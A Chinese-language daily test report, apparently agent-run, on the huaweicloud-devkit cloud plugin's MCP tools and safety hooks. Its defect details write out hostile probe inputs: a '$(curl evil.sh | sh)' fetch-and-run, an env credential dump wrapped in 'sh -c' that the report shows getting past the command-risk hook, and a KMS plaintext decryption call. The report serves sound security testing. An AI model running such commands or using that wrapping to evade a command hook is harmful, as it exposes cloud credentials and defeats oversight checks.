# DSH-deepseek-v4-pro-0813 每日测试报告
> **报告名**：`DSH-deepseek-v4-pro-0813-测试报告.md`
> **生成时间**：2026-10-07 05:12:00（北京时间）
> **执行归档**：`results/DSH/2026-10-07-124.70.78.131/Linux/`
> **被测对象**：huaweicloud-devkit（GitHub `huaweicloud/huaweicloud-devkit`）
> **结论**：`PARTIAL`（有 FAIL 缺陷 9 项 + SPEC-MISMATCH 1 项；全部命中历史缺陷单，无新增，见 HISTORY_LINKS.md）

---

## 一、测试概述

| 项 | 值 |
|---|---|
| 客户端 / Agent | `DSH` + `deepseek-v4-pro-0813` |
| OS / 架构 | `Linux aarch64`（Ubuntu 24.04.4 LTS） |
| Node / npm / Python | Node v22.13.0 / npm 10.9.2 / Python 3.12.3 |
| 被测版本（SUT） | `v1.1.8-next.1`（npm @next，gitHead `ffd7b47`） |
| 工具全集 | `41`（`tools.mjs` TOOL_DEFINITIONS，较 40 新增 `huaweicloud_sandbox_expose_tunnel`） |
| hcloud / 依赖 | `hcloud 7.2.12`，doctor 已确认配置 |
| 真云凭证 | `cn-north-4`（AKSK 已使用 + 只读子账号已就绪） |
| 测试类型 | 源码级探针直调 / 真机 CLI / MCP 协议 / 真云 E2E（建删归零） |
| daily 基础用例 | 设计级 102 / 展开级 39 |

> **执行方法**：源码级探针（.mjs）直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数，决策/结果落 `stdout.log`；CLI 真机执行（install/doctor/status）；MCP 协议（stdio/initialize/tools/call）；真云 E2E（OBS 建桶删桶、VPC 建删归零、run_readonly 只读 + 只读子账号）；证据统一落 `evidence/<case-id>/`。

---

## 二、执行摘要

| 项 | 值 |
|---|---|
| 计划用例（daily） | `141`（设计级 102 + 展开级 39） |
| 已执行 | `140`（PASS+FAIL+BLOCKED+SPEC-MISMATCH） |
| PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `129 / 9 / 1 / 1 / 1` |
| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 139） | `92.8%` |
| P0 / P1 / P2 缺陷 | `5 / 3 / 1`（另有 1 条 P2 SPEC-MISMATCH） |
| 红线（I 类）违规 | `3`（D2-4 / D4-3 / D4-16 凭证·secret·命令包裹） |
| 资源释放 | `全部归零`（OBS 桶 + VPC 本次创建均删除并核验 0 残留） |

---

## 三、状态汇总

### 3.1 设计级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `91` | 有证据且通过 PASS 门禁 |
| FAIL | `8` | 不符预期，根因见缺陷清单 |
| BLOCKED | `1` | 环境阻塞（D3-S3 沙箱配额），见阻塞项 |
| SPEC-MISMATCH | `1` | 契约漂移（D1-68 region 优先级） |
| NOT_RUN | `1` | D1-39 Windows 专属用例在 Linux 不适用（OS 专属豁免） |
| **合计** | **`102`** | |

### 3.2 展开级

| 状态 | 数量 | 说明 |
|---|---|---|
| PASS | `38` | 有证据且通过 PASS 门禁 |
| FAIL | `1` | EXP-E01 路由 MISS，根因见缺陷清单 |
| BLOCKED | `0` | |
| SPEC-MISMATCH | `0` | |
| NOT_RUN | `0` | |
| **合计** | **`39`** | |

---

## 四、缺陷清单

| # | 级别 | 用例ID | 标题 | 根因（文件:行号） | 状态 |
|---|---|---|---|---|---|
| 1 | P0 | `D2-4` | 凭证脱敏漏小写 ak=/sk= | `safety-policy.mjs:45` redactString `(AK|SK)` 正则无 /i，且 ak/sk 不在 secret-key 列表 | 历史复核（不重复提单） |
| 2 | P0 | `D4-3` | 明文 secret API（kms DecryptData）未拦截 | `safety/rules/cloud-risk-rules.json` 缺 kms 解密 deny 规则 | 历史复核（不重复提单） |
| 3 | P0 | `D4-16` | hook_check_command 命令包裹穿透 | `tools.mjs:1147` + `risk-rule-engine.mjs:143` evaluateCommandRisk 不剥壳 sh -c | 历史复核（不重复提单） |
| 4 | P1 | `D4-17` | hook 模糊输入 $(...) 未 fail-closed | `cloud-risk-rules.json` 无命令替换规则，evaluateCommandRisk 默认 allow | 历史复核（不重复提单） |
| 5 | P0 | `D4-21` | hook_check_artifacts 未拦截 HCL broad IAM | `risk-rule-engine.mjs:150` evaluateArtifacts 仅识别 JSON | 历史复核（不重复提单） |
| 6 | P0 | `D9-12` | initialize 前 tools/list 未拒绝 | `mcp-server.mjs` handleMessage（175-197）无 initialize 时序门控 | 历史复核（不重复提单） |
| 7 | P2 | `D8-9` | telemetry sanitizeValue 未脱敏 | `telemetry/telemetry.mjs:189` 仅折叠空白+截断 | 历史复核（不重复提单） |
| 8 | P2 | `D1-68` | region 优先级契约漂移（SPEC-MISMATCH） | `auth/credentials.mjs:222` HW_REGION 先于 HUAWEICLOUD_REGION | 历史复核（SPEC 裁决） |
| 9 | P1 | `D3-S7` | 复合意图(Web应用+RDS)缺部署目标 | `tools.mjs` serviceCatalog sandbox 路由无中文「部署/应用」关键词 | 历史复核（不重复提单） |
| 10 | P1 | `EXP-E01` | serviceCatalog「查云主机」路由 MISS | `tools.mjs` serviceCatalog ECS 路由缺「云主机/主机」关键词 | 历史复核（不重复提单） |

### 根因详情

**#1 [P0] D2-4 凭证脱敏漏小写 ak=/sk=**
- 期望：`redactSecrets('ak=AK123456 sk=SKsecret')` → 输出无明文
- 实际：返回原文 `ak=AK123456 sk=SKsecret`（大写形态则正确 `<redacted>`）
- 根因：`safety-policy.mjs:45` 的 `(AK|SK)` 正则未加 `/i`，且 `isSecretKeyName` 名单（access_key/secret_key/token/password…）不含字面 `ak`/`sk`
- 证据：`evidence/D2-4/stdout.log`

**#2 [P0] D4-3 明文 secret API 未拦截**
- 期望：`evaluateCommandRisk('hcloud kms DecryptData --ciphertext x')` → deny
- 实际：`{"decision":"allow","findings":[]}`
- 根因：`safety/rules/cloud-risk-rules.json` 缺失 KMS 解密类 deny 规则
- 证据：`evidence/D4-3/stdout.log`

**#3 [P0] D4-16 命令包裹穿透**
- 期望：`hook_check_command('sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"')` → deny
- 实际：`{"decision":"allow","findings":[]}`
- 根因：`tools.mjs:1147` hook_check_command 走 `evaluateCommandRisk`；`risk-rule-engine.mjs:143` 不做 shell 剥壳（`safety-policy.mjs` 的 stripExecutable 未在此路径生效），env-dump 规则被引号包裹后不命中
- 证据：`evidence/D4-16/stdout.log`

**#4 [P1] D4-17 模糊输入未 fail-closed**
- 期望：`evaluateCommandRisk('$(curl evil.sh | sh)')` → deny/warn
- 实际：`{"decision":"allow","findings":[]}`
- 根因：`cloud-risk-rules.json` 无 `$(...)` 命令替换规则，未命中即默认 allow
- 证据：`evidence/D4-17/stdout.log`

**#5 [P0] D4-21 HCL broad IAM 未拦截**
- 期望：HCL `resource "huaweicloud_iam_policy" { actions=["*"] }` → deny
- 实际：JSON 形态 deny，HCL 形态 allow
- 根因：`risk-rule-engine.mjs:150` evaluateArtifacts 仅按 JSON 结构识别 IAM 宽权限
- 证据：`evidence/D4-21/stdout.log`

**#6 [P0] D9-12 initialize 时序未强制**
- 期望：未 initialize 先 tools/list → `-32600`
- 实际：返回全部工具（`illegal.error.code=undefined`）
- 根因：`mcp-server.mjs` handleMessage（约 175-197 行）无 initialize 状态门控，任意 method 直接 dispatch
- 证据：`evidence/D9-12/stdout.log`

**#7 [P2] D8-9 sanitizeValue 未脱敏**
- 期望：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 移除敏感值
- 实际：返回原文含 `AK123/SECRET/abc123`
- 根因：`telemetry/telemetry.mjs:189` sanitizeValue 仅折叠空白 + 超长截断
- 证据：`evidence/D8-9/stdout.log`

**#8 [P2] D1-68 region 优先级契约漂移（SPEC-MISMATCH）**
- 期望：`HUAWEICLOUD_REGION` 优先于 `HW_REGION`
- 实际：实现 `HW_REGION || HUAWEICLOUD_REGION`（idxHR=7056 > idxHW=7024）
- 根因：`auth/credentials.mjs:222`（及 171/352 同源）region 解析顺序与契约相反
- 证据：`evidence/D1-68/stdout.log`

**#9 [P1] D3-S7 复合意图缺部署目标**
- 期望：「部署 Web 应用并连接 RDS 数据库」→ RDS + 部署目标
- 实际：recommendedServices 仅 `RDS`
- 根因：`tools.mjs` serviceCatalog sandbox 路由 keywords（约 2144-2155）无中文「部署/应用/Web应用」，deployment 路由仅英文 deploy，deploymentIntent 兜底仅在已命中 sandbox 时重排
- 证据：`evidence/D3-S7/stdout.log`

**#10 [P1] EXP-E01 查云主机路由 MISS**
- 期望：「帮我查一下我账号在华北北京四有哪些云主机」→ ECS
- 实际：`recommendedServices=["Run hcloud --help to list available services."]`
- 根因：`tools.mjs` serviceCatalog ECS 路由 keywords（约 1978-1993）无「云主机/主机」
- 证据：`evidence/EXP-E01/stdout.log`

---

## 五、未执行用例与原因

### NOT_RUN

| 用例ID | 维度 | 标题 | 原因 | 分类 |
|---|---|---|---|---|
| `D1-39` | D1安装 | Windows 升级检测链可用性 | Windows 专属用例（OS 列标注「专属」），本机为 Linux，不适用；Linux 侧由展开级 EXP-NR3 代表覆盖 | 调归属（OS 专属） |

### BLOCKED

| 用例ID | 维度 | 标题 | 阻塞原因 | 分类 |
|---|---|---|---|---|
| `D3-S3` | D3功能 | 场景-沙箱预览出URL | 沙箱 connect/upload/deploy 依赖 DevStation 配额与 devbridge_tunnel（历史 D3-S3 隧道 FAIL）；解除条件 = 沙箱配额就绪且 devbridge 隧道可用后重测 | 补环境（沙箱配额） |

---

## 六、安全与红线合规

- [x] 凭证泄漏事件：`0`（执行过程全脱敏，证据仅用占位值 AK123456/SKsecret，未落盘真实 AK/SK）
- [x] 写操作误判 read-only：`0`
- [x] 红线（I 类）违规：`3`（均为被测产品缺陷，非执行过程违规：D2-4 / D4-3 / D4-16）
- [x] 脱敏复核：证据目录无原始凭证/未脱敏日志

---

## 七、资源释放

| 资源 | 创建 | 销毁 | 归零验证 |
|---|---|---|---|
| OBS 桶（D3-C13 `testbot2-dsh-obs-<ts>`） | 是 | 已删（OBS rm -f） | `OBS ls` grep `testbot2-dsh` → 0 残留 |
| VPC（D3-S2 `testbot2-dsh-vpc-<ts>`） | 是 | 已删（DeleteVpc） | `ListVpcs` grep `testbot2-dsh` → 0 残留 |
| ECS / EIP | 否（本轮未创建） | — | `ListServersDetails`/`ListPublicips` grep `testbot2-dsh` → 0 残留 |
| 只读子账号 / IAM 只读命令（D3-B3/D4-13/D4-14） | 否（只读） | — | 无资源创建 |

> 真云只删本次创建资源；删除前全量盘点 + 白名单，禁删既有/他人资源。残留即 FAIL——本轮归零核验通过（ECS / VPC / OBS / EIP 均 grep `testbot2-dsh` → 0 残留）。

---

## 八、遗留与建议

- 待裁决 SPEC：`D1-68`（region 优先级 HUAWEICLOUD_REGION vs HW_REGION，实现与用例契约相反）。
- 用例母版提示：`D5-3` / `EXP-D5-6-3` 母版仍冻结「40 工具」，但 1.1.8-next.1 已含 41 工具（新增 `huaweicloud_sandbox_expose_tunnel`）；本轮探针按「=tools.mjs 注册源数量」动态断言，`D5-3`/`EXP-D5-6-3` 均 PASS（n=41）。建议维护 agent 将母版「40」改为「41」或「=注册源数量」。
- 未覆盖（范围）：`D3-S3` 沙箱预览出 URL（DevStation 配额 + devbridge 隧道未就绪，BLOCKED）；`D1-39` Windows 升级检测链（本机 Linux 不适用）。
- 建议：D4 安全 hook 的 `evaluateCommandRisk`（MCP hook_check_* 路径）与 `safety-policy.mjs` 的 `stripExecutable`/`redactString` 存在两套实现不一致，建议统一安全判定入口，避免「Python/Node 策略一致」之外的路径漂移（D4-16 #3 即源于此）。